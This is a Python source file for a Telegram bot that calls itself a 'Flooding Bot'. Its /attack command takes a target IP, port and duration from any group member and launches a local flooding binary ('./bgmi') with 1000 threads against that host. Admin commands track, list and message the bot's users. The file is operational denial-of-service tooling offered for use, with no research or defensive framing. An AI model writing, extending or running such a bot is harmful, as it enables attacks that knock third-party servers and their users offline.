import subprocess
import json
import asyncio
from telegram import Update, Chat
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from config import BOT_TOKEN, ADMIN_IDS, OWNER_USERNAME

USER_STATS_FILE = "user_stats.json"
DEFAULT_THREADS = 1000
DEFAULT_PACKET = 9

# Load and save user stats
def load_user_stats():
    try:
        with open(USER_STATS_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {"users": {}, "total_commands": 0}
    except Exception as e:
        print(f"Error loading user stats: {e}")
        return {"users": {}, "total_commands": 0}

def save_user_stats(user_stats):
    with open(USER_STATS_FILE, "w") as file:
        json.dump(user_stats, file, indent=4)

def track_user(user_id, username):
    global user_stats
    user_id = str(user_id)
    if user_id not in user_stats["users"]:
        user_stats["users"][user_id] = {"username": username, "commands_issued": 0}
    user_stats["users"][user_id]["commands_issued"] += 1
    user_stats["total_commands"] += 1
    save_user_stats(user_stats)

def is_group_chat(update: Update) -> bool:
    """Check if the command is being used in a group."""
    return update.message.chat.type in [Chat.GROUP, Chat.SUPERGROUP]

async def handle_private_chat(update: Update) -> None:
    """Send a message when the bot is used in a private chat."""
    await update.message.reply_text("This bot is not designed to be used in private chats. Please use it in a group.")

# Command: /attack
async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_group_chat(update):
        await handle_private_chat(update)
        return

    user_id = str(update.message.from_user.id)
    username = update.message.from_user.username or "No username"
    track_user(user_id, username)

    if len(context.args) != 4:
        await update.message.reply_text("Usage: /attack <target_ip> <port> <duration> <sid>")
        return

    target_ip = context.args[0]
    port = context.args[1]
    duration = int(context.args[2])
    sid = context.args[3]

    flooding_command = ['./bgmi', target_ip, port, str(duration), str(DEFAULT_PACKET), str(DEFAULT_THREADS)]
    process = subprocess.Popen(flooding_command)

    await update.message.reply_text(
        f"Flooding started: {target_ip}:{port} for {duration} seconds with {DEFAULT_THREADS} threads."
    )

    await asyncio.sleep(duration)
    process.terminate()

    await update.message.reply_text(f"Flooding attack finished: {target_ip}:{port}.")

# Command: /stats
async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_group_chat(update):
        await handle_private_chat(update)
        return

    user_id = str(update.message.from_user.id)
    if user_id in ADMIN_IDS:
        total_commands = user_stats["total_commands"]
        unique_users = len(user_stats["users"])
        response = (
            f"Bot Usage Stats:\n"
            f"- Total Commands Issued: {total_commands}\n"
            f"- Unique Users: {unique_users}\n\n"
            "Users:\n"
        )
        for uid, info in user_stats["users"].items():
            username = info["username"] or "No username"
            commands_issued = info["commands_issued"]
            response += f"- {username} (ID: {uid}) - {commands_issued} commands\n"
    else:
        response = "ONLY OWNER CAN USE."
    await update.message.reply_text(response)

# Command: /allusers
async def allusers(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_group_chat(update):
        await handle_private_chat(update)
        return

    user_id = str(update.message.from_user.id)
    if user_id in ADMIN_IDS:
        if user_stats["users"]:
            response = "Authorized Users:\n"
            for uid, info in user_stats["users"].items():
                username = info["username"] or "No username"
                response += f"- {username} (ID: {uid})\n"
        else:
            response = "No users found."
    else:
        response = "ONLY OWNER CAN USE."
    await update.message.reply_text(response)

# Command: /broadcast
async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_group_chat(update):
        await handle_private_chat(update)
        return

    user_id = str(update.message.from_user.id)
    if user_id in ADMIN_IDS:
        message = ' '.join(context.args)
        if not message:
            await update.message.reply_text("Usage: /broadcast <message>")
            return

        for uid in user_stats["users"]:
            try:
                await context.bot.send_message(chat_id=int(uid), text=message)
            except Exception as e:
                print(f"Error sending message to {uid}: {e}")
        response = "Message sent to all users."
    else:
        response = "ONLY OWNER CAN USE."
    await update.message.reply_text(response)

# Command: /help
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_group_chat(update):
        await handle_private_chat(update)
        return

    user_id = str(update.message.from_user.id)
    username = update.message.from_user.username or "No username"
    track_user(user_id, username)

    response = (
        f"Welcome to the Flooding Bot by @{OWNER_USERNAME}! Here are the available commands:\n\n"
        "Admin Commands:\n"
        "/allusers - Show all authorized users.\n"
        "/broadcast <message> - Broadcast a message to all authorized users.\n"
        "/stats - View bot usage stats.\n\n"
        "User Commands:\n"
        "/attack <target_ip> <port> <duration> <sid> - Start a flooding attack.\n"
    )
    await update.message.reply_text(response)

# Main function
def main() -> None:
    global user_stats
    user_stats = load_user_stats()

    application = ApplicationBuilder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("stats", stats))
    application.add_handler(CommandHandler("allusers", allusers))
    application.add_handler(CommandHandler("broadcast", broadcast))
    application.add_handler(CommandHandler("help", help_command))

    application.run_polling()

if __name__ == "__main__":
    main()
